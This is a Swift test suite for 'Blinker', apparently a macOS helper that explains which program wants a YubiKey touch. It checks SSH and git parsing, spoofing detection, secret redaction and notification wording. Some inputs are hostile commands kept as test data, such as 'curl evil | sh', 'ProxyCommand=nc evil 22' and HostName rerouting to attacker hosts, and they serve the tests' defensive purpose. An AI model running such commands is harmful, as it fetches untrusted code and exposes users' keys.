import Foundation
import Testing
@testable import Blinker

private func proc(_ exe: String, _ argv: [String], name: String? = nil, started: Date = Date()) -> Proc {
    var p = Proc(pid: 4242, ppid: 1, started: started, name: name ?? String(exe.basename.prefix(16)))
    p.argv = argv
    p.exe = exe
    return p
}

@Suite struct Describing {
    @Test func gitPushOverSSH() {
        let ssh = SSH.parse(["ssh", "-o", "SendEnv=GIT_PROTOCOL", "git@github.com", "git-receive-pack 'guneysol/blinker.git'"])
        #expect(ssh?.action == "push to guneysol/blinker on github.com")
    }

    @Test func fetchOverSSH() {
        let ssh = SSH.parse(["ssh", "-p22", "-T", "git@github.com", "git-upload-pack", "'/a/b.git'"])
        #expect(ssh?.action == "fetch from a/b on github.com")
    }

    @Test func chainedRemoteCommandIsNotAFetch() {
        let ssh = SSH.parse(["ssh", "prod", "git-upload-pack x; curl evil | sh"])
        #expect(ssh?.action == "run a command on prod")
    }

    @Test func reroutedHostIsFlagged() {
        let ssh = SSH.parse(["ssh", "-o", "ProxyCommand=nc evil 22", "github.com"])
        #expect(ssh?.action == "connect to github.com (via custom ssh options)")
        #expect(SSH.parse(["ssh", "-J", "jump", "github.com"])?.rerouted == true)
        #expect(SSH.parse(["ssh", "-A", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-TA", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-o", "ForwardAgent=yes", "github.com"])?.displayHost == "github.com (forwards your key)")
        #expect(SSH.parse(["ssh", "-p", "22", "github.com"])?.forwardsAgent == false)
    }

    @Test func nonASCIIHostIsFlagged() {
        #expect(SSH.parse(["ssh", "g\u{0456}thub.com"])?.action.contains("non-ASCII") == true)
    }

    @Test func gitSubcommandSkipsGlobalOptions() {
        #expect(Git.subcommand(["git", "-C", "/x", "-c", "a=b", "--no-pager", "push", "origin"]) == ["push", "origin"])
        #expect(Git.action(["push", "-u", "origin", "main"]) == "push to origin")
        #expect(Git.action(["commit", "-m", "x"]) == "sign a commit")
    }

    @Test func sshKeygenSigningIsNotParsedAsAHost() {
        let tool = Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "git", "-f", "k"]))
        #expect(tool.action == "sign with your SSH key")
        #expect(tool.isHelper(for: "commit"))
    }

    @Test func onlyTheRealHelperBorrowsGitsLabel() {
        // A hook script under `git commit` that talks to the agent is not "signing a commit".
        #expect(!Tool(proc("/usr/bin/python3", ["python3", "hook.py"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/usr/bin/ssh", ["ssh", "x"])).isHelper(for: "commit"))
        // Only the exact invocation git makes counts as signing.
        #expect(Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "--status-fd=2", "-bsau", "K"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "-d", "secrets.gpg"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "-bsau", "K"])).isHelper(for: "commit"))
        #expect(Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "git", "-f", "k"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "file", "-f", "k"])).isHelper(for: "commit"))
    }
}

@Suite struct Spoofing {
    @Test func renamedBinaryIsNotKnown() {
        let fake = proc("/tmp/x/git", ["git", "push"])
        #expect(!Tool.isKnownLocation(fake.exe))
        #expect(Tool.isKnownLocation("/usr/bin/ssh"))
    }

    @Test func nameMismatchIsCaught() {
        #expect(!Tool(proc("/usr/bin/ssh", ["git", "push"])).nameMatchesExecutable) // argv[0] lies
        #expect(!Tool(proc("/usr/bin/ssh", ["ssh"], name: "git")).nameMatchesExecutable)
        #expect(Tool(proc("/usr/bin/ssh", ["ssh", "host"])).nameMatchesExecutable)
    }

    @Test func toolKindComesFromThePathNotTheName() {
        #expect(Tool(proc("/tmp/evil", ["ssh", "github.com"], name: "ssh")).kind == .other)
    }

    @Test func appNameNeedsAnApplicationsFolder() {
        #expect(Requests.appName("/Applications/Ghostty.app/Contents/MacOS/ghostty") == "Ghostty")
        #expect(Requests.appName("/tmp/Ghostty.app/Contents/MacOS/ghostty") == nil)
        #expect(Requests.appName(NSHomeDirectory() + "/Applications/Ghostty.app/Contents/MacOS/ghostty") == nil)
    }

    @Test func agentNameFromArgvOnlyForRuntimes() {
        var ssh = proc("/usr/bin/ssh", ["ssh", "claude"])
        ssh.cwd = ""
        #expect(Requests.origin([ssh]) == nil)
        #expect(Requests.origin([proc("/opt/homebrew/bin/node", ["node", "/x/claude"])]) == "Claude Code")
    }

    @Test func invisibleAndBidiCharactersAreRemoved() {
        #expect(Sanitize.clean("ma\u{202E}in\u{200B}", limit: 50) == "main")
        #expect(Sanitize.clean("a\nb\tc", limit: 50) == "a b c")
        #expect(Sanitize.clean("ma\u{3164}in\u{2800}", limit: 50) == "main") // blank look-alikes
    }

    @Test func combiningMarksCannotStackOrDodgeTheLimit() {
        let zalgo = "a" + String(repeating: "\u{0301}", count: 500)
        #expect(Sanitize.clean(zalgo, limit: 10).unicodeScalars.count <= 10)
        #expect(Sanitize.clean(String(repeating: "x", count: 100), limit: 10).unicodeScalars.count == 10)
    }

    @Test func keepEndTruncatesFromTheFront() {
        #expect(Sanitize.clean("/very/long/path/to/repo", limit: 6, keepEnd: true) == "…/repo")
    }
}

@Suite struct Redaction {
    @Test func urlCredentialsAndQueries() {
        #expect(Sanitize.redactURL("https://me:ghp_x@github.com/a/b?token=1") == "https://github.com/a/b?•••")
    }

    @Test func secretFlagsAndPairs() {
        #expect(Sanitize.redact(["curl", "-H", "Authorization: Bearer abc"]) == ["curl", "-H", "•••"])
        #expect(Sanitize.redact(["x", "--api-key", "v"]) == ["x", "--api-key", "•••"])
        #expect(Sanitize.redact(["x", "--token=v"]) == ["x", "--token=•••"])
        #expect(Sanitize.redact(["mysql", "-pS3cret"]) == ["mysql", "-p•••"])
        #expect(Sanitize.redact(["env", "API_KEY=v"]) == ["env", "API_KEY=•••"])
    }

    @Test func tokenShapedWords() {
        #expect(Sanitize.redact(["deploy --flag ghp_abcdefghijklmnop"]) == ["deploy --flag •••"])
        #expect(Sanitize.redactTokens("a8f5f167f44f4964e6c998dee827110c") == "•••")
        #expect(Sanitize.redactTokens("git-receive-pack") == "git-receive-pack")
    }

    @Test func pushRemoteIsRedacted() {
        #expect(Git.action(["push", "https://u:p@h/x?sig=1"]) == "push to https://h/x?•••")
    }
}

@Suite struct Titles {
    @Test func titleKeepsTheServer() {
        #expect(Request.demo.title == "Push to guneysol/blinker on github.com")
        #expect(Request.demo.headline == "Claude Code wants to push to guneysol/blinker on github.com")
    }
}

@Suite struct Waits {
    @Test func olderClientRemainsACandidate() {
        let now = Date()
        let old = Request.demo.with(started: now.addingTimeInterval(-600))
        let new = Request.demo.with(started: now.addingTimeInterval(-1))
        let wait = Wait(began: now, requests: [new, old], looked: true)
        #expect(wait.likely == nil)
        #expect(wait.fresh == [new, old])
        #expect(wait.idle.isEmpty)
    }

    @Test func twoFreshClientsAreAmbiguous() {
        let now = Date()
        let wait = Wait(began: now, requests: [Request.demo.with(started: now), Request.demo.with(started: now)], looked: true)
        #expect(wait.likely == nil)
        #expect(wait.headline == "One of 2 programs is asking")
        // The same request twice is said once.
        #expect(Store.notificationText(wait).body == "Claude Code: Push to guneysol/blinker on github.com (2 requests)")
    }

    @Test func differentAskersAreAllNamed() {
        let now = Date()
        let fetch = Request(pid: 2, started: now, exe: "/usr/bin/ssh", knownLocation: true, who: "Codex",
                            action: "fetch from acme/api on github.com", command: "ssh", place: nil, host: "github.com")
        let wait = Wait(began: now, requests: [Request.demo.with(started: now), fetch], looked: true)
        #expect(Store.notificationText(wait).body == "Claude Code: Push to guneysol/blinker on github.com\nor Codex: Fetch from acme/api on github.com")
        #expect(wait.summary == "Push to guneysol/blinker or Fetch from acme/api")
    }

    @Test func noClientIsUnknown() {
        #expect(Wait(began: Date(), requests: [], looked: true).headline == "An unknown program is asking")
    }

    @Test func longRunningClientRemainsVisible() {
        let now = Date()
        let wait = Wait(began: now, requests: [Request.demo.with(started: now.addingTimeInterval(-600))], looked: true)
        #expect(wait.likely != nil)
        #expect(wait.headline == Request.demo.headline)
    }

    @Test func warningsLeadTheNotification() {
        let now = Date()
        let odd = Request(pid: 1, started: now, exe: "/tmp/ssh", knownLocation: false, who: "Ghostty",
                          action: "push to a/b on github.com", command: "ssh", place: nil, host: "github.com")
        let text = Store.notificationText(Wait(began: now, requests: [odd], looked: true))
        #expect(text.body.hasPrefix("Unusual program: /tmp/ssh"))
        #expect(Store.notificationText(Wait(began: now, requests: [Request.demo], looked: true)).title == "YubiKey needs a touch")
        for args in [["ssh", "github.com", "-A"], ["ssh", "github.com", "-o", "HostName=example.com"]] {
            let host = SSH.parse(args)!.displayHost
            let request = Request(pid: 1, started: now, exe: "/usr/bin/ssh", knownLocation: true,
                                  who: nil, action: "connect", command: "ssh", place: nil, host: host)
            let notice = Store.notificationText(Wait(began: now, requests: [request], looked: true))
            #expect(notice.title == "YubiKey needs a touch. Check first")
            #expect(notice.body.hasPrefix("Requested host:"))
        }
        #expect(Store.notificationText(Wait(began: now, requests: [Request.demo.with(started: now)], looked: true)).body
                == "Claude Code: Push to guneysol/blinker on github.com")
    }

    @Test func timeExtensionLinesAreRevalidated() {
        let good = #"{"eventMessage":"Time extension received","processImagePath":"\#(TouchWatcher.driver)"}"#
        let forged = #"{"eventMessage":"Time extension received","processImagePath":"/tmp/fake"}"#
        #expect(TouchWatcher.isTimeExtension(Data(good.utf8)))
        #expect(!TouchWatcher.isTimeExtension(Data(forged.utf8)))
        #expect(!TouchWatcher.isTimeExtension(Data("Filtering the log data".utf8)))
    }
}

extension Request {
    func with(started: Date) -> Request {
        Request(pid: pid, started: started, exe: exe, knownLocation: knownLocation, who: who,
                action: action, command: command, place: place, host: host)
    }
}

extension Request {
    static let demo = Request(
        pid: 0, started: Date(), exe: "/usr/bin/ssh", knownLocation: true, who: "Claude Code",
        action: "push to guneysol/blinker on github.com", command: "git push origin feat/notify",
        place: "~/code/blinker (feat/notify)", host: "github.com"
    )
}

/// Regressions for the second security audit.
@Suite struct AuditFixes {
    @Test func sshOptionsAreReadLikeSshReadsThem() {
        // Tab separators and leading whitespace, which ssh accepts.
        #expect(SSH.parse(["ssh", "-o", "\tHostName evil.example", "github.com"])?.rerouted == true)
        #expect(SSH.parse(["ssh", "-o", "ForwardAgent\tyes", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-oFORWARDAGENT = yes", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-o", "ForwardAgent=no", "github.com"])?.forwardsAgent == false)
        // Socket forwards can carry the agent.
        #expect(SSH.parse(["ssh", "-R", "/tmp/x:/Users/me/.gnupg/S.gpg-agent.ssh", "host"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-L", "8080:localhost:80", "host"])?.forwardsAgent == false)
        #expect(SSH.parse(["ssh", "-o", "Include /tmp/evil.conf", "github.com"])?.rerouted == true)
    }

    @Test func lookAlikeSpacesCantFakeTheServer() {
        let call = SSH.parse(["ssh", "git@evil.example", "git-receive-pack 'acme/web\u{00A0}on\u{00A0}github.com'"])
        #expect(call?.action == "run a command on evil.example")
        #expect(SSH.parse(["ssh", "git@evil.example", "git-receive-pack 'acme/web'"])?.action == "push to acme/web on evil.example")
    }

    @Test func temporaryFoldersAreFlagged() {
        #expect(Tool.isTemporaryLocation("/tmp/x/claude"))
        #expect(Tool.isTemporaryLocation("/private/var/folders/ab/T/claude"))
        #expect(Tool.isTemporaryLocation(NSHomeDirectory() + "/Downloads/claude"))
        #expect(!Tool.isTemporaryLocation(NSHomeDirectory() + "/.local/bin/claude"))
    }

    @Test func protectedFoldersIgnoreCaseAndAliases() {
        let home = NSHomeDirectory()
        #expect(!Place.canRead(home + "/documents/x"))
        #expect(!Place.canRead(home + "/DOWNLOADS"))
        #expect(!Place.canRead("/System/Volumes/Data" + home + "/Documents/x"))
        #expect(!Place.canRead(home + "/Library/Containers/com.example/Data"))
        #expect(Place.canRead(home))
    }

    @Test func headersAreRedacted() {
        #expect(Sanitize.redact(["curl", "-HAuthorization: token abcdef0123456789"]) == ["curl", "-H•••"])
        #expect(Sanitize.redact(["git", "-c", "http.extraHeader=Authorization: Basic eDp5", "fetch"]) == ["git", "-c", "•••", "fetch"])
    }
}

@Suite struct SecurityRegressions {
    @Test func optionsAfterDestinationAreParsed() throws {
        let call = try #require(SSH.parse(["ssh", "github.com", "-o", "HostName=attacker.invalid", "-A"]))
        #expect(call.rerouted)
        #expect(call.forwardsAgent)
        #expect(call.remoteCommand.isEmpty)
        #expect(SSH.parse(["ssh", "host", "-o"]) == nil)
        #expect(SSH.parse(["ssh", "host", "echo", "-A"])?.forwardsAgent == false)
        #expect(SSH.parse(["ssh", "--", "host", "-A"])?.forwardsAgent == false)
    }
    @Test func oldSuspiciousClientStillWarns() {
        let old = Request(pid: 1, started: Date().addingTimeInterval(-600), exe: "/tmp/client",
                          knownLocation: false, who: nil, action: "use your key", command: "client", place: nil)
        let wait = Wait(began: Date(), requests: [old], looked: true)
        #expect(Store.notificationText(wait).body.hasPrefix("Unusual program:"))
    }
}

@Suite struct RefreshRegressions {
    @Test func departuresAndChangedDescriptionsRefresh() {
        let now = Date()
        let first = Request(pid: 12, started: now, exe: "/usr/bin/ssh", knownLocation: true,
                            who: nil, action: "connect to first", command: "ssh first", place: nil)
        let second = Request(pid: 13, started: now, exe: "/usr/bin/ssh", knownLocation: true,
                             who: nil, action: "connect to second", command: "ssh second", place: nil)
        var wait = Wait(began: now, requests: [first, second], looked: true)
        let refreshed1 = wait.refreshRequests([second])
        #expect(refreshed1)
        #expect(wait.likely?.id == second.id)
        let changed = Request(pid: 13, started: now, exe: "/usr/bin/ssh", knownLocation: true,
                              who: nil, action: "connect to changed", command: "ssh changed", place: nil)
        let refreshed2 = wait.refreshRequests([changed])
        #expect(refreshed2)
        #expect(wait.likely?.id == second.id)
        #expect(Store.notificationText(wait).body.contains("changed"))
        let refreshed3 = wait.refreshRequests([changed])
        #expect(!refreshed3)
        let refreshed4 = wait.refreshRequests([])
        #expect(refreshed4)
    }
}

@Suite struct Audit20261111 {
    @Test func quotedSSHKeywordsWarn() {
        #expect(SSH.parse(["ssh", "-o", "\"HostName\" attacker.invalid", "github.com"])?.rerouted == true)
        #expect(SSH.parse(["ssh", "-o", "\"ForwardAgent\" yes", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-o", "\rHostName attacker.invalid", "github.com"])?.rerouted == true)
    }
}

@Suite struct CancellationFeedback {
    @Test func cancellationWarningSurvivesClientDeparture() {
        let request = Request.demo
        var wait = Wait(began: Date(), requests: [request], looked: true, stopped: [request.id])
        #expect(Store.notificationText(wait).title.contains("don’t touch"))
        _ = wait.refreshRequests([])
        #expect(Store.notificationText(wait).title.contains("don’t touch"))
        #expect(Store.notificationText(wait).body.contains("times out"))
    }
}
